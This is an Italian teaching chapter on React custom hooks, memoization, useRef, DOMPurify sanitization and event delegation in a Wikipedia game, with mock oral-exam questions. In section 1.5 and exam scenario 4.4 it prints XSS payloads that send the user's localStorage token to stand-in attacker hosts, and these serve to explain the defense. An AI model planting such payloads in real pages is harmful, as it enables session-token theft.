# Capitolo 7: Custom Hooks, Game Engine e Sicurezza del DOM

---

## 1. Teoria Fondamentale

### 1.1 Le Regole degli Hook e l'Architettura Interna di React Fiber
Gli Hook (`useState`, `useEffect`, `useRef`, ecc.) sono funzioni speciali che consentono ai componenti funzionali di "agganciarsi" allo stato e al ciclo di vita di React.
Il funzionamento interno degli Hook si basa su **due regole inderogabili**:
1. **Invocare gli Hook solo al livello più alto**: Non richiamare mai Hook all'interno di blocchi condizionali (`if`), cicli (`for`, `while`) o funzioni annidate.
2. **Invocare gli Hook solo da componenti o Custom Hook React**: Non invocarli all'interno di funzioni JavaScript generiche.

#### Perché React impone questo vincolo: La Linked List dei Fiber Nodes
A differenza di quanto si possa intuire, React **non associa lo stato al nome della variabile**.
Internamente, per ogni componente renderizzato, React Fiber mantiene una **Lista Concatenata Monodirezionale (Singly Linked List)** di oggetti `Hook`:

```
   Fiber Node (Component Instance)
      │
      └─► memoizedState ──► [ Hook 1: useState(game) ]
                                   │ next
                                   ▼
                            [ Hook 2: useState(elapsedSeconds) ]
                                   │ next
                                   ▼
                            [ Hook 3: useRef(isNavigating) ]
                                   │ next
                                   ▼
                            [ Hook 4: useEffect(timer) ]
```

A ogni ciclo di re-rendering, React reimposta un puntatore interno (`workInProgressHook`) alla testa della lista e lo fa avanzare di un nodo (`hook = hook.next`) per ogni chiamata a un Hook nel codice:
- Se inserissimo un Hook dentro un `if (condition)`, nei render in cui la condizione è falsa l'ordine della sequenza verrebbe sfasato.
- L'Hook 2 verrebbe abbinato alla cella di memoria dell'Hook 1, provocando corruzione irreversibile dello stato in memoria e crash del runtime con:
  `Rendered fewer hooks than expected. This may be caused by an accidental early return statement.`

---

### 1.2 Il Pattern Custom Hook: Separazione tra Presentazione e Logica di Dominio
Un **Custom Hook** è una funzione JavaScript il cui nome inizia convenzionalmente per `use` (es. `useGameEngine`, `useAuth`, `useLeaderboard`) e che può a sua volta invocare altri Hook di React.

#### Vantaggi Architetturali del Pattern:
1. **Single Responsibility Principle (SRP)**: I componenti grafici (`GamePage`, `HUDBar`, `WikiRenderer`) rimangono focalizzati unicamente sull'accessibilità, il layout e il render visivo. Tutta la complessità asincrona, la gestione degli errori e la sincronizzazione risiedono nel custom hook.
2. **Riutilizzabilità e Testabilità**: La logica del motore di gioco (`useGameEngine`) può essere collaudata isolatamente tramite harness di test come `@testing-library/react-hooks` senza dover instanziare il DOM visivo.
3. **Isolamento dello Stato**: Due componenti che invocano lo stesso Custom Hook non condividono lo stato in memoria (ciascuna invocazione riceve la propria lista di hook isolata), garantendo l'incapsulamento.

---

### 1.3 Ottimizzazione e Memoization: `useCallback`, `useMemo` e `React.memo`
In JavaScript le funzioni e gli oggetti sono tipi di riferimento (*reference types*): `{}` non è mai uguale a `{}` e `(() => {}) !== (() => {})`. A ogni render di un componente funzionale, tutte le funzioni e gli oggetti dichiarati al suo interno vengono **riallocati da zero in memoria**.

```
┌─────────────────┬───────────────────────────────────┬──────────────────────────────────────────┐
│ Meccanismo      │ Cosa Memoizza                     │ Scopo Principale                         │
├─────────────────┼───────────────────────────────────┼──────────────────────────────────────────┤
│ useCallback     │ Riferimento a una funzione        │ Previene re-render di componenti figli   │
│                 │ (Function reference stability)    │ che ricevono callback come props         │
├─────────────────┼───────────────────────────────────┼──────────────────────────────────────────┤
│ useMemo         │ Risultato computato di una        │ Evita ricalcoli onerosi O(N) a ogni      │
│                 │ funzione (Computed value)         │ ciclo di render ordinario                │
├─────────────────┼───────────────────────────────────┼──────────────────────────────────────────┤
│ React.memo      │ Intero componente React           │ Salta il re-render del componente se le  │
│                 │ (High-Order Component - HOC)     │ sue props non sono cambiate              │
└─────────────────┴───────────────────────────────────┴──────────────────────────────────────────┘
```

#### Lo Stale Closure Problem
Se omettiamo una variabile usata dentro `useCallback` o `useEffect` dal relativo **Dependency Array (`deps`)**, la funzione memorizzata "cattura" il valore che la variabile aveva al momento della creazione della closure. Quando la variabile muta nel componente, l'hook continua a vedere il vecchio valore memorizzato, generando gravissimi disallineamenti di stato (*stale state*).

---

### 1.4 Gestione della Mutabilità con `useRef`
`useRef` restituisce un oggetto mutabile con una singola proprietà: `{ current: initialValue }`.
Presenta due caratteristiche cruciali:
1. **Persistenza**: Il valore assegnato a `.current` sopravvive immutato attraverso tutti i cicli di re-render del componente per l'intero suo ciclo di vita.
2. **Assenza di Trigger di Render**: A differenza di `useState`, **modificare `ref.current = true` NON scatena alcun re-render del componente**.

È lo strumento perfetto per tracciare flag operativi imperativi (es. `isNavigatingRef` per impedire click multipli concorrenti prima che la chiamata API precedente sia conclusa) o per mantenere identificatori nativi (es. ID restituito da `setInterval`).

---

### 1.5 Sicurezza Client-Side del DOM, Attacchi XSS e Sanitization con DOMPurify
L'attributo nativo di React `dangerouslySetInnerHTML` bypassa il sistema di escaping automatico di React e inietta stringhe HTML grezze direttamente nel DOM del browser (equivalente di `element.innerHTML`).

#### Anatomia di un attacco Cross-Site Scripting (XSS)
Se un attaccante riesce a iniettare markup malevolo all'interno di una pagina web, può eseguire codice JavaScript arbitrario nel contesto di sicurezza della sessione della vittima.
Esempi di payload malevoli:
```html
<!-- Iniezione di script canonico -->
<script>fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))</script>

<!-- Iniezione tramite tag immagine con handler di errore inline -->
<img src="invalid-image" onerror="fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))" />

<!-- Iniezione tramite protocollo pseudo-URL su ancore -->
<a href="javascript:alert(document.cookie)">Clicca qui</a>
```

#### Il Ruolo di DOMPurify
Per contrastare l'XSS, il client applica il principio di **Defense-in-Depth** (difesa in profondità): anche se il backend sanifica l'HTML con `sanitize-html`, il frontend esegue una seconda sanificazione a runtime con **DOMPurify**.
DOMPurify converte la stringa HTML in un albero DOM temporaneo disconnesso nel browser (`DOMParser`), rimuove con algoritmo whitelist tutti i tag pericolosi (`<script>`, `<object>`, `<iframe>`), spoglia tutti gli handler di eventi inline (`onload`, `onerror`, `onclick`) e neutralizza schemi URI non sicuri (`javascript:`), restituendo un markup garantito privo di vettori d'attacco.

---

### 1.6 Event Delegation su Contenuti HTML Dinamici
Quando si renderizza un articolo di Wikipedia tramite `dangerouslySetInnerHTML`, l'HTML contiene centinaia di link `<a>`.
- **Approccio Naïve**: Attaccare un event listener a ciascun singolo tag `<a>`. Questo consumerebbe una quantità enorme di memoria RAM e richiederebbe di re-agganciare i listener a ogni cambio pagina.
- **Event Delegation**: Si posiziona **un singolo event listener** sull'elemento genitore contenitore (`<div ref={containerRef} onClick={handleClick}>`). Sfruttando il meccanismo di **Event Bubbling** (propagazione degli eventi verso l'alto nell'albero DOM), il click su qualsiasi link risale fino al genitore. Il genitore intercetta l'evento, individua l'ancora tramite `e.target.closest('a')`, blocca il refresh della pagina tramite `e.preventDefault()`, estrae il titolo dell'articolo e inoltra la navigazione all'interno del game loop React.

---

## 2. Il Codice nel Nostro Progetto

### 2.1 File: `frontend/src/hooks/useGameEngine.ts` (Estratto Core)
```typescript
import { useState, useEffect, useCallback, useRef } from 'react';
import axios from 'axios';
import { Game, WikiArticleContent } from '../types';
import { gameApi } from '../api';
import { ErrorCode } from '../constants/errorCodes';

export function useGameEngine() {
  const [game, setGame] = useState<Game | null>(null);
  const [currentArticle, setCurrentArticle] = useState<WikiArticleContent | null>(null);
  const [elapsedSeconds, setElapsedSeconds] = useState<number>(0);
  const [loading, setLoading] = useState<boolean>(false);
  const [error, setError] = useState<string | null>(null);
  const [toastMessage, setToastMessage] = useState<string | null>(null);

  // Ref per sincronizzazione atomica: blocca click concorrenti (Doppio Click Spam)
  const isNavigatingRef = useRef(false);

  const calculateElapsed = (startTimeStr?: string, endTimeStr?: string) => {
    if (!startTimeStr) return 0;
    const start = new Date(startTimeStr).getTime();
    const end = endTimeStr ? new Date(endTimeStr).getTime() : Date.now();
    return Math.max(0, Math.floor((end - start) / 1000));
  };

  // Timer di gioco con gestione del lifecycle e cleanup anti-memory-leak
  useEffect(() => {
    if (game?.status === 'IN_PROGRESS') {
      setElapsedSeconds(calculateElapsed(game.startTime));
      const timer = setInterval(() => {
        setElapsedSeconds(calculateElapsed(game.startTime));
      }, 1000);

      // Cleanup function essenziale
      return () => clearInterval(timer);
    }
    if (game?.status === 'COMPLETED') {
      setElapsedSeconds(calculateElapsed(game.startTime, game.endTime));
    } else {
      setElapsedSeconds(0);
    }
  }, [game?.id, game?.status, game?.startTime, game?.endTime]);

  const makeStep = async (targetTitle: string) => {
    if (!game || loading || isNavigatingRef.current) return;
    isNavigatingRef.current = true;

    try {
      setLoading(true);
      setError(null);
      const activeData = await gameApi.makeStep(game.id, targetTitle);
      setGame(activeData.game);
      setCurrentArticle(activeData.currentArticle);
    } catch (err: unknown) {
      // Gestione errori e toast...
    } finally {
      isNavigatingRef.current = false;
      setLoading(false);
    }
  };

  return {
    game, currentArticle, elapsedSeconds, loading, error, toastMessage,
    makeStep, /* ...altre azioni */
  };
}
```

### 2.2 File: `frontend/src/components/game/WikiRenderer.tsx` (Sanitizzazione ed Event Delegation)
```tsx
export const WikiRenderer: React.FC<WikiRendererProps> = ({
  title,
  htmlContent,
  onNavigate,
  onInvalidLink,
  loading = false,
}) => {
  const containerRef = useRef<HTMLDivElement>(null);

  // Memoization del parsing e della sanificazione DOMPurify
  const sanitizedHtml = useMemo(() => normalizeWikiLinks(htmlContent), [htmlContent]);
  const sections = useMemo(() => parseWikiSections(sanitizedHtml), [sanitizedHtml]);

  // Event Delegation: intercetta tutti i click all'interno del contenitore dell'articolo
  const handleClick = (e: React.MouseEvent<HTMLDivElement>) => {
    if (!(e.target instanceof HTMLElement)) return;
    const anchor = e.target.closest('a');
    if (!anchor) return;

    // Blocca il caricamento standard della pagina da parte del browser
    e.preventDefault();

    const dataTitle = anchor.getAttribute('data-title');
    if (dataTitle) {
      if (!loading) onNavigate(dataTitle);
      return;
    }

    const href = anchor.getAttribute('href') || '';
    const className = anchor.getAttribute('class') || '';
    const { isValid, targetTitle } = isInternalNamespaceZeroLink(href, className);

    if (!isValid || !targetTitle) {
      onInvalidLink?.();
    } else {
      if (!loading) onNavigate(targetTitle);
    }
  };

  return (
    <div
      ref={containerRef}
      onClick={handleClick}
      className="wiki-content ..."
    >
      {sections.map((section) => (
        <div
          key={`${title}-sec-${section.id}`}
          className="wiki-section-body"
          dangerouslySetInnerHTML={{ __html: section.html }}
        />
      ))}
    </div>
  );
};
```

### 2.3 File: `frontend/src/api/client.ts` (Axios Interceptors)
```typescript
export const apiClient: AxiosInstance = axios.create({
  baseURL: API_BASE_URL,
  headers: { 'Content-Type': 'application/json' },
  timeout: 15000,
});

// Request Interceptor: Iniezione automatica del JWT Bearer Token
apiClient.interceptors.request.use(
  (config: InternalAxiosRequestConfig) => {
    const token = localStorage.getItem('token');
    if (token && config.headers) {
      config.headers.Authorization = `Bearer ${token}`;
    }
    return config;
  },
  (error: AxiosError) => Promise.reject(error)
);

// Response Interceptor: Pulizia automatica su 401 Unauthorized
apiClient.interceptors.response.use(
  (response) => response,
  (error: AxiosError) => {
    if (error.response && error.response.status === 401) {
      localStorage.removeItem('token');
    }
    return Promise.reject(error);
  }
);
```

---

## 3. Disamina Riga per Riga

### 3.1 `frontend/src/hooks/useGameEngine.ts`
* **Riga 45: `const isNavigatingRef = useRef(false);`**: Istanzia un riferimento booleano mutabile. Non è memorizzato in uno `useState` perché aggiornare questo flag non deve ridisegnare l'interfaccia, ma serve unicamente come **Semaforo Atomico Client-Side**: impedisce che un utente che clicca rapidamente tre volte su un link invii tre richieste HTTP parallele al server, evitando conflitti di concorrenza 409 (`CONCURRENT_CONFLICT`).
* **Righe 56-61: `calculateElapsed`**: Calcola la differenza in secondi interi `(end - start) / 1000` basandosi sui timestamp assoluti del server, evitando il drift temporale causato da imprecisioni fisiologiche di `setInterval` nel browser.
* **Righe 63-76: `useEffect` del Timer**:
  - `if (game?.status === 'IN_PROGRESS')`: Attiva il cronometro solo se la sessione è effettivamente attiva.
  - `const timer = setInterval(...)`: Registra un intervallo che riesegue `calculateElapsed` ogni 1000 millisecondi.
  - `return () => clearInterval(timer)`: **Funzione di Cleanup**. Viene eseguita prima che l'effetto venga rieseguito o quando il componente che ospita il custom hook viene smontato. Senza questa riga, l'istanza di `setInterval` continuerebbe a girare in background consumando CPU e tentando di invocare `setElapsedSeconds` su un componente inesistente.
  - Dependency Array: `[game?.id, game?.status, game?.startTime, game?.endTime]`. L'intervallo si riavvia solo se cambia l'ID partita o lo stato di avanzamento.

---

### 3.2 `frontend/src/components/game/WikiRenderer.tsx`
* **Righe 125-135: Configurazione di `DOMPurify.sanitize`**:
  - `ALLOWED_TAGS`: Whitelist restrittiva. Ammette tag strutturali (`p`, `div`, `table`, `h1-h6`) e tag inline (`a`, `b`, `img`). Qualsiasi tag `<script>`, `<style>`, `<iframe>`, `<embed>` viene cancellato all'istante.
  - `ALLOWED_ATTR`: Whitelist di attributi autorizzati (`class`, `data-title`, `href`, `src`). Blocca qualsiasi attributo che inizi con `on` (come `onclick`, `onload`, `onerror`).
  - `ALLOWED_URI_REGEXP`: Regex che convalida i protocolli degli URI: ammette unicamente `https?` e percorsi relativi, bloccando schemi `javascript:` e `data:text/html`.
* **Riga 250: `useMemo(() => normalizeWikiLinks(htmlContent), [htmlContent])`**: Ottimizzazione di rendering critica. Il parsing del DOM e la sanificazione dell'HTML sono operazioni pesanti che richiedono vari millisecondi di CPU. Con `useMemo`, React ricalcola la sanificazione solo ed esclusivamente quando la stringa `htmlContent` cambia effettivamente (ovvero al passaggio a una nuova voce enciclopedica), mantenendo reattiva l'interfaccia anche durante la digitazione nel box di ricerca rapida.
* **Righe 288-309: Gestione Delegata dell'Evento `handleClick`**:
  - `const anchor = e.target.closest('a')`: Metodo nativo del DOM. Se l'utente clicca su un'immagine, su un grassetto o su un testo contenuto dentro un link, `closest('a')` risale l'albero fino a individuare il tag `<a>` genitore.
  - `e.preventDefault()`: Annulla il comportamento di default del browser, che altrimenti caricherebbe l'URL `it.wikipedia.org` uscendo dall'applicazione SPA.
  - Estrae l'attributo personalizzato `data-title` e invoca la callback `onNavigate(dataTitle)`, passando il controllo a `useGameEngine.makeStep`.

---

### 3.3 `frontend/src/api/client.ts`
* **Righe 22-33: Request Interceptor**:
  - Intercetta in uscita qualsiasi chiamata HTTP effettuata dall'applicazione.
  - Legge in modo trasparente il token JWT da `localStorage`. Se presente, lo inietta nell'header HTTP `Authorization: Bearer <token>`. In questo modo nessun controller o hook deve occuparsi manualmente di inserire gli header di autenticazione.
* **Righe 38-46: Response Interceptor**:
  - Intercetta in ingresso le risposte HTTP del backend.
  - Se il server risponde con `status === 401` (token non valido o scaduto), rimuove automaticamente `localStorage.removeItem('token')`, sincronizzando lo storage locale con l'avvenuta invalidazione della sessione.

---

## 4. Scenari d'Esame "What-If" (Simulazione Orale)

### Scenario 4.1: Omissione della Funzione di Cleanup in `useEffect` (Timer Leak)
* **Domanda del Docente**: *"Cosa accade se nel file `useGameEngine.ts` rimuoviamo la riga `return () => clearInterval(timer);` dall'effetto del timer?"*
* **Risposta dello Studente**: *"Si genera un gravissimo **Memory Leak** con accumulo esponenziale di timer attivi nel motore JavaScript. Ogni volta che il componente subisce un remount o cambiano le dipendenze (ad esempio al termine della partita o se l'utente abbandona e ne avvia un'altra), il vecchio `setInterval` continua a essere eseguito in background ogni 1000 ms. Dopo alcune partite, centinaia di timer paralleli continuerebbero a chiamare `setElapsedSeconds()`, sprecando cicli di CPU del browser, degradando la batteria sui dispositivi mobili e causando conflitti visivi sui contatori."*

---

### Scenario 4.2: Violazione delle Regole degli Hook con Invocazione Condizionale
* **Domanda del Docente**: *"Cosa succede a runtime se all'interno di un componente inseriamo il seguente codice?"*
  ```tsx
  if (isGameOver) {
    const [score, setScore] = useState(0);
  }
  ```
* **Risposta dello Studente**: *"L'applicazione andrà incontro a un crash fatale a runtime con l'errore: `Error: Rendered fewer hooks than expected`. React memorizza lo stato degli hook all'interno di una lista concatenata ordinata nel Fiber Node. Nel momento in cui `isGameOver` passa da `false` a `true` (o viceversa), il numero totale e l'ordine degli hook invocati cambia rispetto al render precedente. Il puntatore interno di Fiber (`workInProgressHook`) punterà all'hook sbagliato nella lista, corrompendo lo stato di tutti gli hook successivi. Il motore di React rileva questa violazione strutturale e blocca l'intera applicazione per prevenire la corruzione silenziosa dei dati."*

---

### Scenario 4.3: Omissione di Dipendenze nel Dependency Array (Stale Closure)
* **Domanda del Docente**: *"Supponiamo di creare una funzione `const logClick = useCallback(() => { console.log(game.clickCount); }, []);` con un array di dipendenze vuoto `[]`. Cosa stamperà a console dopo che l'utente ha effettuato 10 click?"*
* **Risposta dello Studente**: *"Stamperà costantemente `0`! Questo è il classico bug della **Stale Closure** (chiusura stantia). Con le parentesi quadre vuote `[]`, `useCallback` memorizza la funzione al momento del primissimo render di montaggio. All'interno dell'ambiente lessicale di quella funzione originaria, `game.clickCount` valeva `0`. Poiché la funzione non viene mai ricreata (avendo omesso `[game?.clickCount]` dalle dipendenze), la callback farà sempre riferimento al vecchio scope in memoria ignorando i successivi aggiornamenti dello stato."*

---

### Scenario 4.4: Iniezione di HTML Grezzo in `dangerouslySetInnerHTML` senza DOMPurify
* **Domanda del Docente**: *"Cosa accadrebbe se nel componente `WikiRenderer` scrivessimo `dangerouslySetInnerHTML={{ __html: htmlContent }}` utilizzando direttamente la stringa non sanificata? Mostra un esempio di payload con cui un attaccante potrebbe rubare il token dell'utente."*
* **Risposta dello Studente**: *"L'applicazione diventerebbe vulnerabile a un attacco **Stored Cross-Site Scripting (XSS)**. Se una pagina di Wikipedia contenesse un payload malevolo iniettato (o se l'API venisse manipolata tramite Man-in-the-Middle), il browser eseguirebbe il codice script iniettato. Un payload funzionante è:
  ```html
  <img src="x" onerror="fetch('https://evil-hacker.com/steal?t=' + encodeURIComponent(localStorage.getItem('token')))" />
  ```
  Appena il browser tenta di renderizzare l'immagine e fallisce il caricamento da `'x'`, esegue il codice JavaScript all'interno di `onerror`. Lo script estrae il JWT dal `localStorage` del client e lo trasmette al server dell'attaccante. Con **DOMPurify**, l'attributo `onerror` viene rimosso dal DOM prima del rendering, neutralizzando l'exploit."*

---

### Scenario 4.5: Omissione di `e.preventDefault()` nell'Event Delegation dei Link
* **Domanda del Docente**: *"Cosa accade se nella funzione `handleClick` di `WikiRenderer` rimuoviamo l'istruzione `e.preventDefault()`?"*
* **Risposta dello Studente**: *"Il browser eseguirà il comportamento nativo di navigazione ipertestuale HTML. L'utente clicca su un link `<a href="/wiki/Napoli">`: il browser abbandona l'applicazione React SPA in memoria ed effettua una richiesta HTTP GET standard per una nuova pagina al server. Il server risponderà con un 404 (o reindirizzerà all'index), l'intero stato JavaScript del gioco in memoria RAM (`useGameEngine`, timer, cache) andrà completamente perso e la sessione di speedrun verrà interrotta, distruggendo l'esperienza utente della Single Page Application."*
